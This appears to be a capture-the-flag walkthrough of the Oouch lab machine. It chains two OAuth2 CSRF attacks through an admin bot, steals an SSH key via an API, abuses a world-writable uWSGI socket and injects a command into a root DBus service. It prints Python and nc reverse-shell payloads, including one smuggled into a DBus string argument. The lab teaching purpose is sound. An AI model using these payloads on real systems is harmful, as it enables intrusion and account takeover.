<p><strong>Target IP:</strong> <code>10.129.29.195</code><br /><strong>Attacker IP:</strong> <code>10.10.14.6</code><br /><strong>Difficulty:</strong> Hard<br /><strong>Category:</strong> Linux / OAuth2 / CSRF / Docker Escape / DBus Command Injection</p>

<h2 id="philosophy-the-hacker-mindset-for-this-box">Philosophy: The Hacker Mindset for This Box</h2>
<p>Before we touch a single command, let's understand <strong>why</strong> this box exists and what mental models you need.</p>
<p><strong>Oouch is an OAuth2 teaching machine.</strong> The creator (<code>qtc</code>) built it to demonstrate that even "secure" modern authentication protocols can be completely compromised by missing a single CSRF token or by trusting user input in a backend service.</p>
<h3 id="the-hacker-mindset-you-need-here">The Hacker Mindset You Need Here:</h3>
<ol>
<li><p><strong>Think in flows, not pages.</strong> OAuth2 is REDACTED a single webpage you can attack in isolation. It's a <em>conversation</em> between three parties: the consumer app, the authorization server, and the user (or admin bot). Your goal is to find the weakest link in that conversation.</p>
</li>
<li><p><strong>Trust boundaries are everything.</strong> The consumer app trusts the authorization server. The authorization server trusts the user's browser. The admin bot trusts the contact form. Every time you see trust, ask: <em>"What if I insert myself into this trust relationship?"</em></p>
</li>
<li><p><strong>CSRF is not dead.</strong> Modern frameworks make CSRF harder, but OAuth2 implementations often forget to validate <code>state</code> parameters or CSRF tokens on cross-site redirects. If you can make an admin's browser send a request you crafted, you win.</p>
</li>
<li><p><strong>Containers are not magic security.</strong> Docker separates processes, but if a container can talk to a host service (like DBus) and that service runs as root and trusts input from the container... the container boundary collapses.</p>
</li>
<li><p><strong>Sockets are files, and files have permissions.</strong> The uWSGI socket was world-writable (<code>srw-rw-rw-</code>). That means <em>any</em> user on the system — even inside a container — can write to it and impersonate the web server.</p>
</li>
</ol>
<hr />
<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
<h3 id="why-recon-matters">Why Recon Matters</h3>
<p>You cannot attack what you do not understand. Before we exploit anything, we need to know:</p>
<ul>
<li>What services are running?</li>
<li>What do they do?</li>
<li>What hints are they giving us?</li>
</ul>
<h3 id="step-0-1-port-scan">Step 0.1: Port Scan</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- -sC -sV 10.129.29.195
</code></pre>
<p><strong>What this does:</strong><br /><code>-p-</code> scans all 65,535 TCP ports. <code>-sC</code> runs default NSE scripts. <code>-sV</code> performs version detection.</p>
<p><strong>Why we do this:</strong><br />We want the full attack surface. A "quick" scan might miss non-standard ports. Oouch runs HTTP on 5000 and 8000 — both non-standard.</p>
<p><strong>Expected output:</strong></p>
<pre><code>PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
5000/tcp open  http    nginx 1.14.2
8000/tcp open  rtsp
</code></pre>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"Four ports. FTP might have anonymous access. SSH is probably key-only. Two HTTP ports means two applications. The machine name is 'Oouch' — that sounds like 'Ouch' or maybe 'OAuth'? Let's keep that hypothesis in mind."</p>
</blockquote>
<h3 id="step-0-2-anonymous-ftp">Step 0.2: Anonymous FTP</h3>
<pre><code class="language-bash" data-language="bash">ftp 10.129.29.195
</code></pre>
<p>Login: <code>anonymous</code> / any password</p>
<pre><code class="language-ftp" data-language="ftp">ls
get project.txt
quit
</code></pre>
<p><strong>What this does:</strong><br />Many FTP servers allow anonymous logins for public file distribution. Developers sometimes leave hints or files here.</p>
<p><strong>Why we do this:</strong><br />It's the lowest-hanging fruit. If we can get files without credentials, we should do it immediately.</p>
<p><strong>Content of <code>project.txt</code>:</strong></p>
<pre><code>Flask -&gt; Consumer
Django -&gt; Authorization Server
</code></pre>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"Flask is a Python micro-framework. Django is a Python web framework. The terms 'Consumer' and 'Authorization Server' are OAuth2 terminology. This confirms our hypothesis: this box is about OAuth2. Port 5000 is probably Flask (consumer app). Port 8000 is probably Django (auth server)."</p>
</blockquote>
<h3 id="step-0-3-adding-hosts-to-etc-hosts">Step 0.3: Adding Hosts to /etc/hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.29.195 oouch.htb consumer.oouch.htb authorization.oouch.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>What this does:</strong><br />Web applications often use virtual hosts (vhosts) to serve different content based on the <code>Host</code> header. Without these DNS entries, your browser won't know where to send requests for those hostnames.</p>
<p><strong>Why we do this:</strong><br />When we eventually see redirects to <code>consumer.oouch.htb</code> or <code>authorization.oouch.htb</code>, our system needs to resolve them. If we skip this, we'll get connection errors later and waste time debugging.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"The application is telling me its own name. I need to make sure my system speaks the same language. OAuth2 relies heavily on redirects between domains. If I can't resolve those domains, I can't follow the authentication flow."</p>
</blockquote>
<hr />
<h2 id="understanding-the-oauth2-architecture">Understanding the OAuth2 Architecture</h2>
<p>Before attacking, we need to understand the three actors:</p>
<h3 id="1-the-consumer-application-flask-port-5000">1. The Consumer Application (Flask, port 5000)</h3>
<p>This is the website the user interacts with. It wants to offer "Login with OAuth" functionality.</p>
<h3 id="2-the-authorization-server-django-port-8000">2. The Authorization Server (Django, port 8000)</h3>
<p>This server authenticates users and issues authorization codes + access tokens.</p>
<h3 id="3-the-resource-server">3. The Resource Server</h3>
<p>Usually the same machine as the authorization server. It holds user data (profile info, SSH keys, etc.). API endpoints like <code>/api/get_user</code> and <code>/api/get_ssh</code> live here.</p>
<h3 id="the-normal-oauth2-flow-simplified">The Normal OAuth2 Flow (simplified):</h3>
<ol>
<li>User clicks "Connect Account" on consumer.</li>
<li>Consumer redirects user to auth server with <code>client_id</code>, <code>redirect_uri</code>, <code>scope</code>, <code>response_type=code</code>.</li>
<li>User logs into auth server and clicks "Authorize".</li>
<li>Auth server redirects user back to consumer's <code>redirect_uri</code> with an <code>?code=...</code> parameter.</li>
<li>Consumer's backend exchanges <code>code</code> + <code>client_secret</code> for an <code>access_token</code>.</li>
<li>Consumer uses <code>access_token</code> to query user data from the resource server.</li>
</ol>
<p><strong>The attack surface lives in steps 3-4.</strong> If the auth server doesn't validate CSRF tokens, we can skip the "Authorize" button step. If the consumer doesn't validate a <code>state</code> parameter, we can trick users into linking their accounts to our OAuth account.</p>
<hr />
<h2 id="step-1-account-registration-on-both-services">Step 1: Account Registration on Both Services</h2>
<h3 id="consumer-app-port-5000">Consumer App (Port 5000)</h3>
<p>Visit: <code>http://consumer.oouch.htb:5000/register</code></p>
<ul>
<li>Register a username like <code>testuser</code> with a password.</li>
<li>Log in.</li>
<li>Explore the interface: Menu, Profile, Documents, About, Contact.</li>
</ul>
<p><strong>What you learn:</strong></p>
<ul>
<li><code>/documents</code> says "administrators only."</li>
<li><code>/contact</code> has a form that says messages are forwarded to the system administrator.</li>
<li><code>/profile</code> shows "Connected Accounts" — currently none.</li>
<li><code>/oauth</code> exists (found via Gobuster or linked from profile).</li>
</ul>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"There's an admin account. I can't access <code>/documents</code>. The contact form talks to an admin bot. The OAuth page lets me connect accounts. This is a setup for a CSRF attack: I need to make the admin bot perform an action on my behalf."</p>
</blockquote>
<h3 id="authorization-server-port-8000">Authorization Server (Port 8000)</h3>
<p>Visit: <code>http://authorization.oouch.htb:8000/signup/</code></p>
<ul>
<li>Register a username like <code>testauth</code> with a password.</li>
<li>Log in.</li>
<li>Note the SSH fields during registration — these will be important later.</li>
</ul>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"The auth server asks for SSH information during signup. OAuth2 consumers can request user data via APIs. If I can get an access token for an admin, I might be able to retrieve their SSH key through an API endpoint. I'm already thinking ahead to the user-shell phase."</p>
</blockquote>
<hr />
<h2 id="step-2-csrf-1-hijacking-the-admin-account-on-the-consumer">Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer</h2>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>When you click "Connect Account" on the consumer, it redirects to the auth server. After you authorize, the auth server redirects back to:</p>
<pre><code>http://consumer.oouch.htb:5000/oauth/connect/token?code=XXXXXXXX
</code></pre>
<p>The consumer receives this request and links the <em>currently logged-in user</em> to the OAuth account that generated the code.</p>
<p><strong>The problem:</strong> There is no <code>state</code> parameter validation. If we can make the admin bot send this request while logged into the consumer as <code>qtc</code>, the admin's <code>qtc</code> account will be linked to <em>our</em> <code>testauth</code> OAuth account.</p>
<h3 id="step-2-1-intercept-the-oauth-connection-flow">Step 2.1: Intercept the OAuth Connection Flow</h3>
<ol>
<li>Make sure you're logged into both consumer (<code>testuser</code>) and auth server (<code>testauth</code>).</li>
<li>Turn on Burp Suite intercept (or any HTTP proxy).</li>
<li>Visit <code>http://consumer.oouch.htb:5000/oauth/connect</code>.</li>
<li>Forward requests until you see the authorize page on the auth server.</li>
<li>Click "Authorize" on the auth server page.</li>
<li>In your proxy, you'll see a POST to <code>/oauth/authorize/...</code> — forward it.</li>
<li>The <strong>next</strong> request is the critical one:<pre><code>GET /oauth/connect/token?code=3swBqy03xWYONlt2T5Rh54jjDhglAY HTTP/1.1
Host: consumer.oouch.htb:5000
</code></pre>
<strong>DROP this request.</strong> Do not let it reach the server.
<strong>Copy the full URL.</strong></li>
</ol>
<p><strong>Why we drop it:</strong><br />If we let this request complete, <em>our</em> <code>testuser</code> account will be linked to our <code>testauth</code> account. That's useless. We want the admin bot to send this request instead, so the admin's account gets linked to our OAuth account.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I'm not the target — the admin is. I need to steal this callback URL and feed it to the admin bot. This is like intercepting a package and re-routing it to a different recipient. The package (the authorization code) is tied to my OAuth account, but the recipient (the consumer session) needs to be the admin's."</p>
</blockquote>
<h3 id="step-2-2-weaponize-the-contact-form">Step 2.2: Weaponize the Contact Form</h3>
<p>Visit <code>http://consumer.oouch.htb:5000/contact</code> while logged in as <code>testuser</code>.</p>
<p>Paste this into the message box:</p>
<pre><code class="language-html" data-language="html">&lt;a href="http://consumer.oouch.htb:5000/oauth/connect/token?code=YOUR_CODE_HERE"&gt;click me&lt;/a&gt;
</code></pre>
<p>Submit the form.</p>
<p><strong>What happens:</strong><br />The admin bot (running as user <code>qtc</code> on the consumer app) receives your message, extracts URLs, and visits them using <code>python-requests</code>. When it clicks your link, it sends the OAuth connection request with <em>its own session cookie</em>. The consumer app links the admin's <code>qtc</code> account to your <code>testauth</code> OAuth account.</p>
<p><strong>Why this works:</strong><br />The consumer app doesn't verify that the request came from the auth server's redirect flow. It just sees a valid code and a valid session cookie, and links them together.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"The contact form is an SSRF (Server-Side Request Forgery) vector. The admin bot is a browser that follows links. I'm feeding it a link that performs a sensitive action on its behalf. This is classic CSRF — the admin is tricked into performing an action they didn't intend."</p>
</blockquote>
<h3 id="step-2-3-login-as-qtc">Step 2.3: Login as qtc</h3>
<p>Wait 1-2 minutes for the admin bot to click the link.</p>
<p>Then visit: <code>http://consumer.oouch.htb:5000/oauth/login</code></p>
<p>Click "Authorize" when prompted. You are now logged in as <code>qtc</code>.</p>
<p>Visit <code>/profile</code> to confirm:</p>
<pre><code>Hello qtc!
</code></pre>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I didn't steal the admin's password. I didn't break the password hash. I simply convinced the system that the admin wanted to link their account to my OAuth account. Now I inherit all of the admin's privileges on the consumer app. This is identity theft via protocol abuse."</p>
</blockquote>

<h2 id="step-3-escalation-to-qtc-and-document-discovery">Step 3: Escalation to qtc and Document Discovery</h2>
<p>Now that you're <code>qtc</code>, visit <code>/documents</code>.</p>
<p>You see three files:</p>
<h3 id="dev-access-txt"><code>dev_access.txt</code></h3>
<pre><code>develop:supermegasecureklarabubu123! -&gt; Allows application registration.
</code></pre>
<h3 id="o-auth-notes-txt"><code>o_auth_notes.txt</code></h3>
<pre><code>/api/get_user -&gt; user data.
oauth/authorize -&gt; Now also supports GET method.
</code></pre>
<h3 id="todo-txt"><code>todo.txt</code></h3>
<pre><code>Chris mentioned all users could obtain my ssh key. Must be a joke...
</code></pre>
<p><strong>What this tells us:</strong></p>
<ol>
<li>We have developer credentials for the auth server.</li>
<li>There's an API endpoint <code>/api/get_user</code> for retrieving user data.</li>
<li>The <code>/oauth/authorize</code> endpoint supports GET — meaning we can send it as a clickable link (no POST required).</li>
<li>SSH keys are accessible via the API.</li>
</ol>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"The developer credentials let me register new OAuth applications. The GET support on <code>/oauth/authorize</code> means I can perform another CSRF attack via the contact form. And the todo is a hint — SSH keys are stored on the auth server and retrievable via API. I'm looking at a clear path to shell access."</p>
</blockquote>
<hr />
<h2 id="step-4-registering-a-malicious-oauth-application">Step 4: Registering a Malicious OAuth Application</h2>
<p>Visit: <code>http://authorization.oouch.htb:8000/oauth/applications/register/</code></p>
<p>You'll get an HTTP Basic Auth prompt. Login with:</p>
<ul>
<li>Username: <code>develop</code></li>
<li>Password: null</li>
</ul>
<p>Fill out the form:</p>
<ul>
<li><strong>Name:</strong> <code>evilapp</code> (or anything)</li>
<li><strong>Client type:</strong> Confidential</li>
<li><strong>Authorization grant type:</strong> Authorization code</li>
<li><strong>Redirect URIs:</strong> <code>http://10.10.14.6/token</code></li>
</ul>
<p>Save it. You'll receive a <strong>Client ID</strong> and <strong>Client Secret</strong>. Write these down.</p>
<p><strong>Why we do this:</strong><br />We need our own OAuth application so we can control the <code>redirect_uri</code>. When the auth server redirects to <code>http://10.10.14.6/token</code>, the authorization code will be sent to our Kali machine instead of the legitimate consumer app.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I'm registering myself as a legitimate third-party application. The auth server doesn't know I'm an attacker — I have valid developer credentials. By setting the redirect URI to my own IP, I'm positioning myself to intercept the most sensitive token in the OAuth flow: the authorization code that grants access to user data."</p>
</blockquote>
<hr />
<h2 id="step-5-csrf-2-stealing-the-admin-s-authorization-code">Step 5: CSRF #2 - Stealing the Admin's Authorization Code</h2>
<h3 id="the-goal">The Goal</h3>
<p>We want the admin bot (logged into the auth server as <code>qtc</code>) to authorize our malicious app. This will redirect to our Kali machine with an authorization code that grants us access to qtc's data.</p>
<h3 id="the-crafted-link">The Crafted Link</h3>
<p>Using your <strong>Client ID</strong>, build this URL:</p>
<pre><code>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=YOUR_CLIENT_ID&amp;response_type=code&amp;redirect_uri=http://10.10.14.6/token&amp;scope=read&amp;state=&amp;allow=Authorize
</code></pre>
<p><strong>Key parameters:</strong></p>
<ul>
<li><code>client_id</code>: Your malicious app's ID.</li>
<li><code>redirect_uri</code>: Must match exactly what you registered.</li>
<li><code>allow=Authorize</code>: Skips the confirmation page and immediately issues the code.</li>
<li><code>state=</code>: Empty, because we don't care about CSRF protection for this attack.</li>
</ul>
<h3 id="execution">Execution</h3>
<ol>
<li><p>Start a listener on Kali:</p>
<pre><code class="language-bash" data-language="bash">sudo nc -lvnp 80
</code></pre>
<p><em>(Port 80 is used because our redirect URI is <code>http://10.10.14.6/token</code> — no port specified means port 80.)</em></p>
</li>
<li><p>Submit the link via the contact form:</p>
<pre><code class="language-html" data-language="html">&lt;a href="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=YOUR_CLIENT_ID&amp;response_type=code&amp;redirect_uri=http://10.10.14.6/token&amp;scope=read&amp;state=&amp;allow=Authorize"&gt;click me&lt;/a&gt;
</code></pre>
</li>
<li><p>Wait 1-2 minutes.</p>
</li>
<li><p>In your <code>nc</code> listener, you'll see:</p>
<pre><code>GET /token?code=Z0neGTs2TBUQvRVevKk7Ad7EkloyHs HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.21.0
</code></pre>
</li>
</ol>
<p><strong>Copy the <code>code</code> value immediately.</strong> These codes expire quickly (usually within minutes).</p>
<p><strong>Why this works:</strong><br />The auth server's <code>/oauth/authorize</code> endpoint supports GET requests and doesn't validate CSRF tokens properly. When the admin bot (already authenticated to the auth server) clicks the link, the auth server sees a valid session and immediately issues an authorization code for our app to access qtc's data.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"This is the second time I'm abusing the contact form. The first CSRF hijacked the admin's identity on the consumer app. This second CSRF hijacks the admin's authorization on the auth server itself. I'm chaining two CSRF vulnerabilities to escalate from an anonymous user to having an authorization token for the admin's most sensitive data."</p>
</blockquote>
<hr />
<h2 id="step-6-exchanging-the-code-for-an-access-token">Step 6: Exchanging the Code for an Access Token</h2>
<p>The authorization code alone is useless. We need to exchange it for an access token using our app's <code>client_id</code> and <code>client_secret</code>.</p>
<pre><code class="language-bash" data-language="bash">curl -s http://authorization.oouch.htb:8000/oauth/token/ \
  -d "grant_type=authorization_code" \
  -d "code=Z0neGTs2TBUQvRVevKk7Ad7EkloyHs" \
  -d "redirect_uri=http://10.10.14.6/token" \
  -d "client_id=YOUR_CLIENT_ID" \
  -d "client_secret=YOUR_CLIENT_SECRET" | jq .
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code class="language-json" data-language="json">{
  "access_token": null,
  "expires_in": 600,
  "token_type": "Bearer",
  "scope": "read",
  "refresh_token": null
}
</code></pre>
<p><strong>Why we do this:</strong><br />The access token is REDACTED actual key that unlocks the resource server APIs. The authorization code was just a temporary voucher.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I now have a Bearer token that represents the admin's identity on the auth server. With this token, I can query any API endpoint that the admin has access to. I'm no longer attacking the web application — I'm now an authenticated API client with the admin's privileges."</p>
</blockquote>
<hr />
<h2 id="step-7-retrieving-the-ssh-key">Step 7: Retrieving the SSH Key</h2>
<p>The documents hinted at <code>/api/get_user</code>, but the todo mentioned SSH keys. Let's try <code>/api/get_ssh</code>:</p>
<pre><code class="language-bash" data-language="bash">curl -s http://authorization.oouch.htb:8000/api/get_ssh \
  -H "Authorization: Bearer REDACTED | jq -r '.ssh_key' &gt; id_rsa_qtc
</code></pre>
<p>Set proper permissions and SSH in:</p>
<pre><code class="language-bash" data-language="bash">chmod 600 id_rsa_qtc
ssh -i id_rsa_qtc qtc@10.129.29.195
</code></pre>
<p><strong>What this does:</strong><br />The <code>Authorization: Bearer</code> header tells the resource server who we are. The server returns qtc's SSH private key, which was stored during registration on the auth server.</p>
<p><strong>Why this works:</strong><br />OAuth2 scopes define what data an app can access. The <code>read</code> scope apparently includes SSH key data. The API endpoint <code>/api/get_ssh</code> was designed to let consumer applications retrieve SSH credentials for automation purposes.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"API enumeration is just like directory enumeration, but for endpoints. <code>/api/get_user</code> gave me profile data. I guessed <code>/api/get_ssh</code> based on the todo hint and the registration form fields. Always fuzz or guess API endpoints once you have a valid token."</p>
</blockquote>
<hr />
<h2 id="step-8-user-flag">Step 8: User Flag</h2>
<p>Once logged in as <code>qtc</code>:</p>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
</code></pre>
<p><strong>Flag:</strong> <code>838d5[redacted]dc8b3f49c</code></p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I didn't brute-force a password. I didn't exploit a buffer overflow. I abused the design of the OAuth2 protocol itself — specifically, missing CSRF protections and overprivileged API endpoints. This is a logical exploit chain, and it's often more powerful than technical exploits because it bypasses traditional security controls like firewalls and IDS."</p>
</blockquote>
<hr />
<h2 id="step-9-post-user-enumeration-discovering-docker-containers">Step 9: Post-User Enumeration - Discovering Docker Containers</h2>
<p>As <code>qtc</code>, check network interfaces:</p>
<pre><code class="language-bash" data-language="bash">ip a
</code></pre>
<p><strong>What you see:</strong></p>
<ul>
<li><code>ens160</code>: The main external interface (10.129.29.195).</li>
<li><code>docker0</code>: Docker's default bridge (172.17.0.1/16).</li>
<li><code>br-325e0b39713a</code>: A custom Docker bridge (172.18.0.1/16).</li>
<li>Multiple <code>veth*</code> interfaces: Virtual Ethernet pairs connecting containers to the bridge.</li>
</ul>
<p><strong>Why this matters:</strong><br />The web applications (ports 5000 and 8000) are running inside Docker containers, not directly on the host. The host is just a Docker host.</p>
<p>Check for container IPs:</p>
<pre><code class="language-bash" data-language="bash">for ip in 172.18.0.{2..5}; do
  echo -n "$ip: "
  timeout 1 bash -c "echo &gt; /dev/tcp/$ip/22" 2&gt;/dev/null &amp;&amp; echo "SSH OPEN" || echo "closed"
done
</code></pre>
<p><strong>What you find:</strong><br /><code>172.18.0.4</code> has SSH open.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"The presence of Docker means the attack surface is larger than just the host. Containers often have different users, different configurations, and sometimes even different vulnerabilities. SSH being open on a container is unusual — it suggests the container is meant to be accessed by developers or by the host for maintenance."</p>
</blockquote>
<p>Also check the note in qtc's home:</p>
<pre><code class="language-bash" data-language="bash">cat ~/.note.txt
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Implementing an IPS using DBus and iptables == Genius?
</code></pre>
<p><strong>What this tells us:</strong><br />There's a DBus-based IPS (Intrusion Prevention System) running. DBus is an inter-process communication system. If we can talk to it, we might be able to interact with a root-owned process.</p>
<p>Check the DBus config:</p>
<pre><code class="language-bash" data-language="bash">cat /etc/dbus-1/system.d/htb.oouch.Block.conf
</code></pre>
<p><strong>What you see:</strong></p>
<pre><code class="language-xml" data-language="xml">&lt;policy user="root"&gt;
    &lt;allow own="htb.oouch.Block"/&gt;
&lt;/policy&gt;

&lt;policy user="www-data"&gt;
    &lt;allow send_destination="htb.oouch.Block"/&gt;
    &lt;allow receive_sender="htb.oouch.Block"/&gt;
&lt;/policy&gt;
</code></pre>
<p><strong>Critical insight:</strong>  </p>
<ul>
<li>The DBus service <code>htb.oouch.Block</code> is <strong>owned by root</strong>.</li>
<li>The user <code>www-data</code> is allowed to send messages to it.</li>
</ul>
<p><strong>But wait</strong> — there is no <code>www-data</code> user on the <em>host</em>. The <code>www-data</code> user exists <strong>inside the consumer container</strong>. This means we need to get a shell as <code>www-data</code> inside the container to talk to this DBus service.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"This is a privilege escalation bridge. The host has a root-owned DBus service that accepts messages from www-data. But www-data doesn't exist on the host — only inside the container. This means the container is intentionally allowed to talk to a root service on the host. If I can become www-data inside the container, I can send commands to root."</p>
</blockquote>
<hr />
<h2 id="step-10-pivoting-into-the-consumer-container">Step 10: Pivoting into the Consumer Container</h2>
<p>From the host (<code>qtc@oouch</code>), SSH into the consumer container:</p>
<pre><code class="language-bash" data-language="bash">ssh qtc@172.18.0.4
</code></pre>
<p>Check the application code:</p>
<pre><code class="language-bash" data-language="bash">ls -la /code/
cat /code/uwsgi.ini
</code></pre>
<p><strong>Contents of <code>uwsgi.ini</code>:</strong></p>
<pre><code class="language-ini" data-language="ini">[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
</code></pre>
<p><strong>Key finding:</strong><br />The uWSGI socket is at <code>/tmp/uwsgi.socket</code> and has permissions <code>777</code> (world-writable).</p>
<p><strong>What is uWSGI?</strong><br />uWSGI is a gateway between the web server (nginx) and the Python application. It listens on a Unix socket and forwards HTTP requests to the Flask app. Normally, only nginx should be able to write to this socket.</p>
<p><strong>Why <code>777</code> is catastrophic:</strong><br />Any user on the system — including <code>qtc</code> inside the container — can write to this socket. If we craft a valid uWSGI request, the uWSGI master process will execute it as the configured user: <code>www-data</code>.</p>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"A world-writable socket is a world-writable file that executes code. If I can speak the uWSGI protocol, I can make the uWSGI server run any command I want — as www-data. This is not a vulnerability in uWSGI itself; it's a configuration vulnerability. Someone set <code>chmod-sock = 777</code> for convenience and created a privilege escalation path."</p>
</blockquote>
<hr />
<h2 id="step-11-exploiting-uwsgi-for-www-data">Step 11: Exploiting uWSGI for www-data</h2>
<h3 id="the-theory">The Theory</h3>
<p>uWSGI communicates over a binary protocol. If we can craft a valid uWSGI packet, we can:</p>
<ol>
<li>Set environment variables like <code>SCRIPT_NAME</code>, <code>PATH_INFO</code>, etc.</li>
<li>Inject Python code or shell commands.</li>
<li>Execute them as the user running uWSGI (<code>www-data</code>).</li>
</ol>
<p>We use a public exploit script: <code>uwsgi_exp.py</code></p>
<h3 id="preparation">Preparation</h3>
<p>On Kali, download and fix the exploit:</p>
<pre><code class="language-bash" data-language="bash">curl -sL https://raw.githubusercontent.com/wofeiwo/webcgi-exploits/master/python/uwsgi_exp.py &gt; uwsgi_exp.py
sed -i 's/if sys.version_info\[0\] == 3: import bytes//' uwsgi_exp.py
</code></pre>
<p>Create a Python reverse shell:</p>
<pre><code class="language-bash" data-language="bash">cat &gt; rev.py &lt;&lt; 'EOF'
import os,pty,socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.18.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
EOF
</code></pre>
<p>Transfer files to host, then to container (or use base64 encoding if scp fails).</p>
<h3 id="execution-2">Execution</h3>
<p><strong>Terminal 1 (Host):</strong> Start the catcher:</p>
<pre><code class="language-bash" data-language="bash">nc -nlvp 4444
</code></pre>
<p><strong>Terminal 2 (Container):</strong> Fire the exploit:</p>
<pre><code class="language-bash" data-language="bash">cd /tmp
python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'python /tmp/rev.py'
</code></pre>
<p><strong>What happens:</strong><br />The exploit writes a crafted uWSGI packet to the socket. The uWSGI master process parses it and executes our Python reverse shell. The shell connects back to the host's Docker bridge IP (<code>172.18.0.1</code>) on port 4444.</p>
<p><strong>In Terminal 1, you get:</strong></p>
<pre><code>connect to [172.18.0.1] from (UNKNOWN) [172.18.0.4] 52612
bash: /root/.bashrc: Permission denied
www-data@1201393c995b:/code$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"I turned a configuration mistake (world-writable socket) into code execution as a different user. This is local privilege escalation inside the container. The uWSGI master process is essentially a command execution service listening on a file. Since the file has no access controls, anyone can use the service."</p>
</blockquote>
<hr />
<h2 id="step-12-dbus-command-injection-to-root">Step 12: DBus Command Injection to Root</h2>
<h3 id="the-theory-2">The Theory</h3>
<p>From the host's DBus config, we know:</p>
<ul>
<li>The service <code>htb.oouch.Block</code> runs as <strong>root</strong>.</li>
<li>The user <code>www-data</code> (inside the container) can send messages to it.</li>
</ul>
<p>The consumer app's source code (in <code>/code/oouch/routes.py</code>) shows how the app interacts with DBus:</p>
<pre><code class="language-python" data-language="python">bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
response = block_iface.Block(client_ip)
</code></pre>
<p>When someone submits XSS to the contact form, the app calls <code>block_iface.Block(client_ip)</code> to block their IP via iptables.</p>
<p><strong>The vulnerability:</strong><br />The root-owned DBus service takes a string (the IP address) and likely executes it in a shell command like:</p>
<pre><code class="language-bash" data-language="bash">iptables -A INPUT -s [USER_INPUT] -j DROP
</code></pre>
<p>If we can control <code>[USER_INPUT]</code>, we can inject arbitrary shell commands.</p>
<h3 id="execution-3">Execution</h3>
<p><strong>Terminal 3 (Host):</strong> Start the root shell catcher:</p>
<pre><code class="language-bash" data-language="bash">nc -nlvp 4445
</code></pre>
<p><strong>Terminal 1 (www-data shell in container):</strong> Send the malicious DBus message:</p>
<pre><code class="language-bash" data-language="bash">dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 172.18.0.1 4445 &gt;/tmp/f;"
</code></pre>
<p><strong>What happens:</strong><br />The DBus service receives our string. Instead of a valid IP like <code>10.10.14.6</code>, it receives a shell command with semicolons. Because the service likely uses unsafe string concatenation or <code>os.system()</code>, it executes our entire payload as root.</p>
<p>The payload:</p>
<ol>
<li>Removes <code>/tmp/f</code> if it exists.</li>
<li>Creates a named pipe at <code>/tmp/f</code>.</li>
<li>Starts an interactive shell (<code>/bin/sh -i</code>) reading from the pipe.</li>
<li>Connects stdin/stdout/stderr to <code>nc 172.18.0.1 4445</code>.</li>
</ol>
<p><strong>In Terminal 3, you get:</strong></p>
<pre><code>connect to [172.18.0.1] from (UNKNOWN) [10.129.29.195] 42370
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p><strong>Hacker Mindset:</strong>  </p>
<blockquote>
<p>"This is the final bridge. The container was supposed to be isolated, but DBus is a shared resource between the container and the host. The root-owned DBus service trusted input from the container's www-data user. By injecting a shell command where an IP address was expected, I turned a 'block this IP' feature into a 'give me a root shell' feature. This is command injection — the most classic vulnerability in existence — hiding inside a modern inter-process communication system."</p>
</blockquote>

<pre><code class="language-bash" data-language="bash">cat /root/root.txt

<h2 id="key-takeaways">Key Takeaways</h2>
<h3 id="technical-lessons">Technical Lessons</h3>
<ol>
<li><p><strong>OAuth2 without CSRF protection is broken.</strong> Both the consumer and the auth server lacked proper <code>state</code> parameter validation, allowing us to chain two CSRF attacks to hijack an admin account and steal their authorization code.</p>
</li>
<li><p><strong>API endpoints leak sensitive data.</strong> The <code>/api/get_ssh</code> endpoint returned private SSH keys. API design should follow the principle of least privilege — if an endpoint isn't needed, don't expose it.</p>
</li>
<li><p><strong>World-writable sockets are code execution.</strong> The uWSGI socket at <code>777</code> permissions allowed any user to inject commands into the web server process.</p>
</li>
